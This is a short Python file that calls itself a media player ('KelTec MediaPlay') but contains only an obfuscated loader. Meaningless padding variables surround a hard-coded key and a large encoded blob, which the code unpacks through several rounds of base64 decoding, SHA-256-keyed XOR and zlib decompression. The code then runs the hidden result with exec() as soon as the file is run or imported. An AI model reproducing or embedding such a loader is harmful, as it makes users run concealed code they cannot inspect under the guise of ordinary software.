# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 607717 ^ 489351
_lx1_1 = len("fdbfff")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-934755)
_lx3_3 = 986608 * 0
_lx4_4 = 817454 ^ 328094
_K = 'c58980c3ae818f24deb3797c2176959f394614e257729d416bfdacf22c6aea1e'
_M = 'wjZqSA2cMKuGlp9AptqWZE5TTYQKtIy3L1WXkDYuAoPEOz8aUsp5946bxEL12sc6TlUc0AW6i7RzXcWWYChT1JM9OhhdzHGmi5Kc'
_D = 'e1u3knYi5IVk9kDYGul42wlM1OFgchaiNCxoqow8LBOg/JQVuYp87VXH/jo4Urx938c9yaEMyn1A3sf9+RWIzv8HEfpqXRwVy1BNTWeYq5tIhUuGlMihU6u+h7ME6hpIhvkPOm5zyfnv2ODHxyGiH6HwKIFP+v09Mz9GwNqHflQ3A26eHLtE/BcEZwJwWgmeejh6URoqLLKNPh8WYqLIsdNm2LOhJxawgtLbAlAU281SLrkceuAhQqBK/zXqBOQdj6ySwCxyCpBM4sVGRFz7+jVL0ixOTmpGUJBBh1nKsyYx83enTnpzm4/3AdEbV0jINNmbobE9Pgs3Oi9bvBmsNLAXSebl8JpvP38rr71EsByKLp/rdUETwFeQwliGJOwa77Z8P10JSMaJh8bcDgy3/+VZGEwd/xQl63vyUgJERzwbrl5G2jdEOTW/WorBFsWbbB+J/ETFjfit8GIqqFYgsUsqdcUSIfNI9fliOe4aAd+pph/Bz/wpjRagarLQMJMj9/XlUsQ6XMB9uLGhi3rB0jCFkcKkLk+B3ZbfKja70LFalWVzO9UT5BihY9bN0aC98luBell69WFYbUafVYkAdCoRjnLZohQRIS5Iz4PTBGmpvKWInHggOVOxWujcyK/p1drQWHtxj0F005TSfO7OArPMiZ+1eCcgSQ2wiBAez7JAJ9jUZU0fdbxB6yADV1g3wnnB82CRMWy/1TSOPHbUTGXYKYsuKWs6I7G4TmIDFfuBLU8wEcarqgpJ0d31DiblmNSL27EJqUDcImoZPgwf5AJcmFC71ebExHeEkjz5RkJb1nW2wz6FMnv7cNXwu/UFKxCN8XN29UaVGFqpwB6mJxW49i0pWWd3kG+9zguH8oC774Cb7HtJjKWEFlYxITiH0xwkz6e+9ETt+I0JKIuvyvAjvoptCXTo6kJaPUAzGzMnMbRmzav6XF2MohJP3n2riSq7NzGlpTgbT6My6hCkUW0InmaRzrUhO6s7j6F25sw0iLGsLEYaMhDTVfe11ZkSs9CIaCMto//LmsJijuF6HFJzIHVdPMHVeonn4gGZqGCwzXGVnH1bmAEkNSSttkXSt2DlpL//shXvepiOQUiifaSYpxbE/yehUnoT77RaCx/7/vFMoBFsxC8NnRF5QfsSAwwC2KSQhfZCIAdM0GDsHUoidzU7BthhUoTHdcZmGEjtBkiY3tJtDmolzaTt2ihZosVKK++BLldpuEV87SM5joLuZXS3TAsMrhhMFeFU5lK6FIXFlNvnxbDMDBNUbnnQb4wo1ksmhKM0w2PXDIFysMQTZrxq5Uxait0Tii+dMIZRysAbant8I8Lzvle9AyvOY+DVlLovPRSj2sPMb+hjRB0+bBqXv21q2j3vCmaQwJm/T2OYN5pE+1admKhIfIo1c7bFoS4FTueylr35Qa9yHehtAP748RYJQyzIvrubYnMsenp2FsqNZvks23+deFj0NvYcVsnSJtQGrXLLMEk2132xTMAfCi+Wb1IMAyBzVGViKWAv4FWkwK2tAQ6j/D2hS9mfWAZ0kcnkNxN2PO51AsSBTAhilqIOCyjE9EXa9KuP5mt75avqh6Sg7cVxVhe3C5CU55FRtvATMKG0cGmpWMcD1evM1XioTHlB6aHvgs+Gw5PkEOMGy0rbwCAlyrHMTDgyQTu8ehiGyMktu34cOEwaVkUw/vy5J/Ruc04jsqdtQb90iPEfMWiCVsejYQ3Mq/SgHYu+fzQuOpH94PP+ObXQIqaEm/P4Ikp8CnEvH5RjGBfpGHtrKY0HELZp28EiyTUjp3aBvmIV9cJJkrAkqB/FX2WOohs+eicd1hYGPNc16jAEWxHbkmTQh5MleL+oIdsh/rU5'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()